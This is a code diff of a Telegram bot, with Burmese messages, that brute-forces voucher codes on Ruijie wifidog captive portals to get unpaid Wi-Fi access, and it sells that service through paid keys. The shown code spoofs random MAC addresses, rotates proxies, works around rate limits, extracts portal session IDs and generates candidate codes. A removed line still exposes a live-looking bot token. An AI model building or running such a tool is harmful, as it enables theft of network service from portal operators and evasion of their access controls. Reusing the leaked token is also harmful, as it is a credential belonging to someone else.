@@ -1,12 +1,6 @@
-    #!/usr/bin/env python3
+#!/usr/bin/env python3
 # ==============================================
 #  Ruijie Voucher Scanner Bot  —  v8.0-FIXED-WIFIDOG
-#  - Admin: @Myogyi10384 (Auto-Paid)
-#  - Forward: @Myogyi10384
-#  - Improved sessionId extraction for wifidog URLs
-#  - Better error handling and logging
-#  - Enhanced /help command
-#  - FULLY WORKING COPY-PASTE
 # ==============================================
 
 import telebot
@@ -24,7 +18,6 @@ import threading
 import logging
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-from aiohttp import web
 import cv2
 import ddddocr
 import numpy as np
@@ -37,11 +30,10 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(level
 logger = logging.getLogger(__name__)
 
 # ======================================================
-#  🔥 CONFIGURATION — Admin & Forward = Myogyi10384
-#  ⚠️ REVOKE THIS TOKEN IMMEDIATELY AND REPLACE!
+#  🔥 CONFIGURATION (GitHub Secrets မှ ဖတ်မည်)
 # ======================================================
-BOT_TOKEN = "9073192699:AAHbzffrE3XzDCOdGrgBNdYJImM4PklP5VA"   # <--- REVOKE THIS!
-ADMIN_IDS = [ "6130147402"]
+BOT_TOKEN = os.environ.get("BOT_TOKEN")  # GitHub ရဲ့ Secrets ထဲက Token ကို ယူမည်
+ADMIN_IDS = ["6130147402"]
 ADMIN_NAME = "Myogyi10384"
 FORWARD_CHANNEL = "@Zawgyi1296"
 
@@ -59,9 +51,7 @@ PROXY_LIST = [
 ]
 random.shuffle(PROXY_LIST)
 
-# ======================================================
-
-# --- Database (unchanged) ---
+# --- Database ---
 _db_conn = None
 _db_lock = threading.Lock()
 
@@ -114,7 +104,7 @@ def get_next_proxy():
         proxy = f"http://{proxy}"
     return proxy
 
-# --- DB Helpers (unchanged) ---
+# --- DB Helpers ---
 @contextmanager
 def get_db_cursor():
     conn = get_db_connection()
@@ -229,7 +219,7 @@ async def forward_to_channel(message_text, parse_mode=None):
     except Exception as e:
         logger.error(f"Forward error: {e}")
 
-# ==================== KEYBOARDS (unchanged) ====================
+# ==================== KEYBOARDS ====================
 def get_main_keyboard(user_id=None):
     keyboard = InlineKeyboardMarkup(row_width=2)
     if user_id:
@@ -327,9 +317,13 @@ def get_admin_back_keyboard():
     return keyboard
 
 # ==================== BOT INSTANCE ====================
+if not BOT_TOKEN:
+    logger.error("BOT_TOKEN is not set! Please add it to GitHub Secrets.")
+    exit(1)
+
 bot = AsyncTeleBot(BOT_TOKEN)
 
-# ==================== HELP COMMAND (Enhanced) ====================
+# ==================== HELP COMMAND ====================
 @bot.message_handler(commands=['help'])
 async def help_command(message):
     user_id = str(message.chat.id)
@@ -364,26 +358,11 @@ PAID USER များသာ Scan လုပ်ခွင့်ရှိသည်�
 
 ✅ **Admin Auto-Paid!**
 သင်သည် Admin ဖြစ်သောကြောင့် KEY မလိုအပ်ပါ။
-သင်၏ ID သည် Admin List တွင်ပါဝင်ပြီးသားဖြစ်သည်။
-Menu မှ PAID USER ကိုနှိပ်ပြီး KEY မထည့်ဘဲ ဆက်လုပ်နိုင်ပါသည်။
 
 ━━━━━━━━━━━━━━━━━━━━
 📌 **Portal URL Format:**
 လက်ရှိ Bot သည် **Ruijie wifidog** portal များအတွက် ဒီဇိုင်းထုတ်ထားသည်။
 Portal URL ကို `/portal [URL]` ဖြင့် ထည့်ပါ။
-ဥပမာ:
-`/portal https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C`
-
-ဒါမှမဟုတ် Portal page URL လည်းရသည်:
-`/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00`
-
-💡 **Admin ဖြစ်ပါက URL စစ်ဆေးမှုကို ကျော်သွားပြီး ဘယ် URL ကိုမဆို ထည့်သွင်းနိုင်သည်။**
-
-━━━━━━━━━━━━━━━━━━━━
-🔢 **Scan Modes:**
-6, 7, 8 → Digit only (0-9)
-engsmall6, engsmall7, engsmall8 → English small letters (a-z)
-engmixed6, engmixed7, engmixed8 → English small + digits (a-z0-9)
 
 ━━━━━━━━━━━━━━━━━━━━
 ⚠️ **Warning:**
@@ -394,7 +373,7 @@ Use only on authorized networks. Illegal use is prohibited.
 """
     await bot.reply_to(message, help_text, parse_mode="Markdown")
 
-# ==================== START COMMAND (Auto-Paid for Admin) ====================
+# ==================== START COMMAND ====================
 @bot.message_handler(commands=['start'])
 async def start(message):
     user_id = str(message.chat.id)
@@ -492,7 +471,7 @@ async def handle_key(message):
     )
     await forward_to_channel(f"✅ **New User Registered**\n\n👹 Name: {message.from_user.first_name}\n🆔 ID: {user_id}\n🔑 Key: {key}\n⏰ Plan: {key_info['plan']}\n🔢 Code Limit: {key_info['code_limit']}", parse_mode="Markdown")
 
-# ==================== GENKEY, DELKEY, SENDALL (unchanged) ====================
+# ==================== GENKEY, DELKEY, SENDALL ====================
 @bot.message_handler(commands=['genkey'])
 async def genkey(message):
     if not is_admin(str(message.chat.id)):
@@ -576,12 +555,11 @@ async def send_all_broadcast(message):
     await bot.reply_to(message, f"✅ User {count} ယောက်ထံသို့ စာပို့ပြီးပါပြီ။")
     await forward_to_channel(f"📢 Broadcast sent to {count} users\n\n{args[1]}")
 
-# ==================== PORTAL COMMAND (FIXED URL VALIDATION) ====================
+# ==================== PORTAL COMMAND ====================
 @bot.message_handler(commands=['portal'])
 async def handle_portal(message):
     user_id = str(message.chat.id)
     
-    # Admin bypass: accept any URL without checking
     if is_admin(user_id):
         args = message.text.split(maxsplit=1)
         if len(args) < 2:
@@ -595,7 +573,6 @@ async def handle_portal(message):
         await forward_to_channel(f"🔗 Admin set portal URL: {url}")
         return
 
-    # Non-admin: validate URL
     if user_id not in paid_users and user_id not in approve:
         await bot.reply_to(message, "❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။")
         return
@@ -615,9 +592,7 @@ async def handle_portal(message):
     else:
         await bot.reply_to(message, f"❌ Portal URL မှားယွင်းနေပါသည်။ ကျေးဇူးပြု၍ ပြန်လည်စစ်ဆေးပါ။")
 
-# ==================== IMPROVED check_session_url ====================
 async def check_session_url(session_url, use_proxy=True):
-    """More forgiving URL check: accepts any portal-like URL including wifidog."""
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9',
@@ -631,17 +606,14 @@ async def check_session_url(session_url, use_proxy=True):
                 if resp.status >= 400:
                     return False
                 final_url = str(resp.url)
-                # Accept if sessionId, portal, maccauth, wifidog, gw_id, etc. present
                 keywords = ['sessionId', 'portal', 'maccauth', 'index.html', 'wifidog', 'gw_id', 'gw_sn']
                 if any(k in final_url for k in keywords):
                     return True
-                # Check HTML content for portal keywords
                 content_type = resp.headers.get('content-type', '')
                 if 'text/html' in content_type:
                     text = await resp.text()
                     if any(k in text for k in ['sessionId', 'accessCode', 'portal', 'maccauth']):
                         return True
-                # Fallback: accept if status 200 and URL contains "portal" or "auth"
                 if resp.status == 200 and ('portal' in final_url or 'auth' in final_url):
                     return True
                 return False
@@ -649,53 +621,41 @@ async def check_session_url(session_url, use_proxy=True):
         logger.error(f"check_session_url error: {e}")
         return False
 
-# ==================== IMPROVED get_session_id ====================
 async def get_session_id(session, session_url, previous_session_id=None):
-    """Extract sessionId from wifidog URL or redirects."""
     mac = get_mac()
     url = replace_mac(session_url, mac)
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0'
     }
     try:
-        # First, try to get sessionId from the URL itself (query string)
         if 'sessionId=' in url:
             match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', url)
             if match:
                 return match.group(1)
         
-        # If not, follow redirects and check final URL
         async with session.get(url, headers=headers, allow_redirects=True) as req:
             final_url = str(req.url)
-            # Check final URL for sessionId
             match = re.search(r'[?&]sessionId=([a-zA-Z0-9]+)', final_url)
             if match:
                 return match.group(1)
-            # Check if it's a wifidog redirect that might have sessionId in the query
-            # Also, sometimes sessionId is in the response body as a meta or script variable
-            # For simplicity, we'll try to parse the HTML for sessionId
             content_type = req.headers.get('content-type', '')
             if 'text/html' in content_type:
                 text = await req.text()
-                # Try to find sessionId in the HTML (common in script tags)
                 html_match = re.search(r"sessionId['\"]?\s*[:=]\s*['\"]([a-zA-Z0-9]+)['\"]", text)
                 if html_match:
                     return html_match.group(1)
-                # Also try in input fields
                 input_match = re.search(r'<input[^>]*name=["\']sessionId["\'][^>]*value=["\']([a-zA-Z0-9]+)["\']', text, re.IGNORECASE)
                 if input_match:
                     return input_match.group(1)
-            # If still none, return previous if any
             return previous_session_id
     except Exception as e:
         logger.error(f"get_session_id error: {e}")
         return previous_session_id
 
-# ==================== SCAN, STOP, RESULT, RECHECK, PROXY (unchanged) ====================
+# ==================== SCAN, STOP, RESULT, RECHECK, PROXY ====================
 @bot.message_handler(commands=['scan'])
 async def handle_scan(message):
     args = message.text.split(maxsplit=1)
@@ -789,14 +749,13 @@ async def proxy_command(message):
     status_text = "ON" if new_status else "OFF"
     await bot.reply_to(message, f"{'🟢' if new_status else '🔴'} Proxy {status_text} ဖြစ်သွားပါပြီ။\n\nProxy ကို Portal URL စစ်တဲ့အခါမှသာ သုံးမှာဖြစ်ပြီး Scan ဖတ်တဲ့အခါမှာတော့ မသုံးပါ။")
 
-# ==================== CALLBACK HANDLER (unchanged except admin bypass) ====================
+# ==================== CALLBACK HANDLER ====================
 @bot.callback_query_handler(func=lambda call: True)
 async def callback_handler(call):
     chat_id = call.message.chat.id
     user_id = str(chat_id)
     user_name = call.from_user.first_name or call.from_user.username or "User"
 
-    # Admin callbacks
     if call.data.startswith("admin_"):
         if not is_admin(str(chat_id)):
             await bot.answer_callback_query(call.id, "❌ သင် Admin မဟုတ်ပါ။")
@@ -850,7 +809,6 @@ async def callback_handler(call):
             return
         return
 
-    # Proxy toggle
     if call.data in ["menu_proxy_on", "menu_proxy_off"]:
         if user_id not in paid_users and user_id not in approve:
             await bot.answer_callback_query(call.id, "❌ သင် PAID USER မဟုတ်ပါ။")
@@ -867,7 +825,6 @@ async def callback_handler(call):
         await forward_to_channel(f"🔄 Proxy Toggled\n\n👹 User: {user_name}\n🆔 ID: {user_id}\n📊 Status: {status_text}")
         return
 
-    # User menu callbacks
     if call.data == "menu_back":
         if user_id in paid_users or user_id in approve:
             proxy_enabled = db_get_proxy_setting(user_id)
@@ -1017,7 +974,7 @@ async def callback_handler(call):
                 paid_users[user_id] = True
             else:
                 await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
-                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန်  Admin {{}} သို့ ဆက်သွယ်ပါ။",
+                    text=f"❌ သင်၏ user ID ကို registered မလုပ်ရသေးပါ။\n\nPAID USER ဖြစ်ရန်  Admin {ADMIN_NAME} သို့ ဆက်သွယ်ပါ။",
                     reply_markup=get_back_keyboard())
                 await bot.answer_callback_query(call.id)
                 return
@@ -1038,7 +995,7 @@ async def callback_handler(call):
             return
         user_data[chat_id]['selected_mode'] = mode
         user_data[chat_id]['start_digit'] = None
-        text = f"🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါသူမကလည်းတစ်ခြားရင်မှာ။\n🛑 STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။မင်းသူမပါ်ချစ်တာရပ်သင့်နေပါပီ"
+        text = f"🔍 သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။"
         await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
             text=text, reply_markup=get_start_scam_keyboard())
         await bot.answer_callback_query(call.id)
@@ -1058,7 +1015,7 @@ async def callback_handler(call):
         else:
             text += f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
         await bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id,
-            text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။သူမကလည်းမင်းအပေါ်ဖောက်ပြန်သွား",
+            text=text + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
             reply_markup=get_start_scam_keyboard())
         await bot.answer_callback_query(call.id)
         return
@@ -1135,7 +1092,7 @@ async def users_list_command(message):
     else:
         await bot.reply_to(message, text, parse_mode="Markdown")
 
-# ==================== SCANNING ENGINE FUNCTIONS ====================
+# ==================== SCANNING ENGINE ====================
 def get_mac():
     first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
     mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
@@ -1324,20 +1281,17 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     if response and 'request limited' in response.lower():
                         await asyncio.sleep(random.uniform(0.5, 1.0))
                         continue
-                    # If we got a response, break out of attempt loop
                     break
         except Exception as e:
             logger.error(f"perform_check attempt {attempt+1} error: {e}")
             await asyncio.sleep(0.5)
             continue
     else:
-        # All attempts failed
         return
 
     if not response:
         return
 
-    # Detect success
     if 'logonUrl' in response:
         if recheck:
             return code
@@ -1391,10 +1345,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             except Exception as e:
                 logger.error(f"Limited message error: {e}")
     else:
-        # Unknown response – log it
         logger.info(f"Unknown response for code {code}: {response[:100]}")
 
-# --- Code generators, run_bruteforce, send_success_file unchanged ---
 def digit_generator(length):
     return "".join(random.choice(string.digits) for _ in range(length))
 
@@ -1560,19 +1512,6 @@ async def send_success_file(chat_id):
         except Exception as e:
             logger.error(f"send_success_file error: {e}")
 
-# ==================== WEB SERVER ====================
-async def handle(request):
-    return web.Response(text="Bot is running 24/7!")
-
-async def web_server():
-    app = web.Application()
-    app.router.add_get('/', handle)
-    runner = web.AppRunner(app)
-    await runner.setup()
-    port = int(os.environ.get('BOT_PORT', 8099))
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-
 # ==================== MAIN ====================
 async def start_polling():
     backoff = 5
@@ -1599,7 +1538,8 @@ async def main():
         ssl=False
     )
     try:
-        asyncio.create_task(web_server())
+        # GitHub Actions မှာ Web Server မလိုအပ်လို့ ပိတ်ထားပါတယ်
+        # asyncio.create_task(web_server())
         await start_polling()
     finally:
         await _connector.close()
